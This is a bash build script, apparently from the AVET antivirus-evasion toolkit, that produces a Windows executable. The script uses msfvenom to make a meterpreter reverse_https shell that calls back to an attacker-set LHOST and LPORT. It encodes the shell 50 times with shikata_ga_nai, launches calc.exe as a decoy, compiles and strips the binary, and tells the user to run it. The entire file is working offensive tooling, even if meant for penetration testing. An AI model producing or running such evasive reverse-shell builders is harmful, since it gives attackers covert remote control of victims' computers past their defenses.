#!/bin/bash          


#DESCRIPTION_START
# Apply shikata 50 times.
# Preexecute calc.exe before actual payload.
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > input/sc_c.txt

# set command source
set_command_source static_from_here "calc.exe"

# set command execution method
set_command_exec exec_via_cmd

# set shellcode source
set_payload_source static_from_file input/sc_c.txt

# set decoder and crypto key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# compile to exe file
$win32_compiler -o output/calcfromcmd_50xshikata_revhttps_win32.exe source/avet.c
strip output/calcfromcmd_50xshikata_revhttps_win32.exe

# cleanup
cleanup_techniques


echo "
# Execute the following command:
# $ calcfromcmd_50xshikata_revhttps_win32.exe
"
